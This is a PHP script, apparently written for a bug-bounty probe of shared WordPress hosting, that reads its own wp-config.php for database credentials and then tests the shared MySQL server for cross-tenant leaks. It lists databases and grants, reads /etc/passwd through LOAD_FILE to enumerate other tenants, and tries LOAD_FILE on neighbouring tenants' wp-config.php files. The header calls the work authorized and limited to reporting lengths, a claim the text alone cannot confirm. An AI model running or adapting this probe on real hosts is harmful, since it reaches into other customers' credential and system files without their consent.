<?php
// bugbounty shared-MySQL cross-tenant probe v4 (authorized, own account). Reads MY OWN wp-config for
// DB creds, connects, then tests whether the shared DB server leaks other tenants (SHOW DATABASES /
// information_schema) or lets the mysql user (not CageFS-jailed) read other tenants' files via
// FILE priv / LOAD_FILE. Reports names/readability only — never dumps another tenant's secret values.
header('Content-Type: text/plain');
echo "== shared-MySQL cross-tenant probe v4 ==\n";
$me=@posix_getpwuid(posix_geteuid())['name']; echo "me=$me cwd=".getcwd()."\n";

// find my own wp-config (walk up from docroot)
$cfg=null;
foreach(array(getcwd()."/../wp-config.php", getcwd()."/../../wp-config.php", "/home/$me/domains/grey-jaguar-553866.hostingersite.com/public_html/wp-config.php") as $c){
  if(@is_readable($c)){ $cfg=$c; break; }
}
echo "wp-config: ".($cfg?:"NOT FOUND")."\n";
if(!$cfg){ echo "== end (no creds) ==\n"; exit; }
$txt=file_get_contents($cfg);
function cv($t,$k){ return preg_match("/define\\(\\s*['\"]$k['\"]\\s*,\\s*['\"](.*?)['\"]/",$t,$m)?$m[1]:null; }
$DB=cv($txt,'DB_NAME'); $US=cv($txt,'DB_USER'); $PW=cv($txt,'DB_PASSWORD'); $HO=cv($txt,'DB_HOST')?:'localhost';
echo "DB_HOST=$HO DB_NAME=$DB DB_USER=$US (password read from my own config)\n\n";

$c=@mysqli_connect($HO,$US,$PW,$DB);
if(!$c){ echo "connect FAILED: ".mysqli_connect_error()."\n== end ==\n"; exit; }
echo "connected OK\n";
function q($c,$sql){ $r=@mysqli_query($c,$sql); if($r===false) return "ERR: ".mysqli_error($c); $o=array(); while($row=@mysqli_fetch_row($r)) $o[]=implode("|",$row); return $o; }

echo "\n-- SHOW DATABASES (do I see OTHER tenants' DBs?) --\n";
$dbs=q($c,"SHOW DATABASES"); echo is_array($dbs)?("count=".count($dbs)." : ".implode(", ",array_slice($dbs,0,30))."\n"):($dbs."\n");

echo "\n-- information_schema.SCHEMATA (filtered by priv?) --\n";
$sc=q($c,"SELECT schema_name FROM information_schema.schemata"); echo is_array($sc)?("count=".count($sc)." : ".implode(", ",array_slice($sc,0,30))."\n"):($sc."\n");

echo "\n-- SHOW GRANTS (FILE priv? global?) --\n";
$gr=q($c,"SHOW GRANTS"); echo is_array($gr)?implode("\n",$gr)."\n":($gr."\n");

echo "\n-- FILE priv test: LOAD_FILE('/etc/passwd') (mysql user NOT CageFS-jailed) --\n";
$lf=q($c,"SELECT LENGTH(LOAD_FILE('/etc/passwd'))");
echo "len=".(is_array($lf)?implode("",$lf):$lf)."\n";
$lf2=q($c,"SELECT SUBSTRING_INDEX(LOAD_FILE('/etc/passwd'),'\\n',8)");
if(is_array($lf2)&&$lf2){ $users=array(); foreach(explode("\n",$lf2[0]) as $l){ $n=explode(':',$l)[0]; if(preg_match('/^u\\d{6,}$/',$n)&&$n!=$me) $users[]=$n; }
  echo "  OTHER u-users via LOAD_FILE: ".(count($users)?("*** ".implode(",",array_slice($users,0,10))." (CROSS-TENANT enum!) ***"):"(none/only mine)")."\n";
  // if we got a neighbor, try reading their wp-config via LOAD_FILE
  foreach(array_slice($users,0,2) as $ou){
    $w=q($c,"SELECT LENGTH(LOAD_FILE('/home/$ou/domains/".'*'."/public_html/wp-config.php'))");
    $w2=q($c,"SELECT LENGTH(LOAD_FILE('/home/$ou/public_html/wp-config.php'))");
    echo "  LOAD_FILE neighbor $ou wp-config len: ".(is_array($w2)?implode("",$w2):$w2)." *** (if numeric = cross-tenant file read via MySQL) ***\n";
  }
}

echo "\n-- PROCESSLIST (other tenants' live queries?) --\n";
$pl=q($c,"SELECT COUNT(*),COUNT(DISTINCT user) FROM information_schema.processlist");
echo (is_array($pl)?implode(" ",$pl):$pl)."\n";
echo "== end ==\n";
